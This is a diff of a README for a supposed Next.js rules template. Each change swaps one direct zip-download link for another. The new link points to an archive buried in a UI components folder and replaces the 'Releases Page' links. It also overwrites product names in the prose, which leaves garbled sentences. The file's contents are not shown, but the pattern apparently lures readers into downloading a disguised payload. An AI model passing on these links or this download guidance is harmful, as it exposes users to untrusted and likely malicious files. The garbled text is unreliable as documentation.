@@ -2,11 +2,11 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip%20Latest%https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip)](https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip)
+[![Download Latest Release](https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip%20Latest%https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip)](https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip)
 
 ## 📖 Introduction
 
-Welcome to the **cline-rules-nextjs-template**! This template helps you create professional applications using https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip It includes AI guidance, TypeScript, and Tailwind CSS for a complete development experience. Whether you build simple projects or enterprise-level applications, you'll find everything you need in one place.
+Welcome to the **cline-rules-nextjs-template**! This template helps you create professional applications using https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip It includes AI guidance, TypeScript, and Tailwind CSS for a complete development experience. Whether you build simple projects or enterprise-level applications, you'll find everything you need in one place.
 
 ## 🚀 Getting Started
 
@@ -14,10 +14,10 @@ To begin using this template, follow the steps below. No advanced knowledge is r
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version of the template.  
-   [Visit Releases Page](https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip)
+   [Visit Releases Page](https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip)
 
 2. **Choose Your Download**  
-   On the Releases page, you will see a list of available downloads. Click on the version you want to use. Look for files that end with `.zip` or `https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip`, as these will allow you to easily extract the application.
+   On the Releases page, you will see a list of available downloads. Click on the version you want to use. Look for files that end with `.zip` or `https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip`, as these will allow you to easily extract the application.
 
 3. **Download the File**  
    After selecting a version, click the download link. The file will start downloading to your computer.
@@ -53,7 +53,7 @@ This template comes packed with features to streamline your development process:
 
 For the best experience, make sure your system meets the following requirements:
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip**: Version 14 or higher
+- **https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip**: Version 14 or higher
 - **NPM**: Version 6 or higher
 - **Internet Connection**: Required for downloading files and accessing online resources
 
@@ -71,4 +71,4 @@ This template is licensed under the MIT License. You are free to use, modify, an
 
 ## 🏁 Conclusion
 
-This README guide helps you download and run the **cline-rules-nextjs-template** successfully. Enjoy creating your applications with ease! For more updates, visit the [Releases Page](https://raw.githubusercontent.com/Johanruiz2404/cline-rules-nextjs-template/main/alcidine/cline-rules-nextjs-template.zip) regularly.
+This README guide helps you download and run the **cline-rules-nextjs-template** successfully. Enjoy creating your applications with ease! For more updates, visit the [Releases Page](https://github.com/Johanruiz2404/cline-rules-nextjs-template/raw/refs/heads/main/src/components/ui/rules_template_cline_nextjs_3.4.zip) regularly.
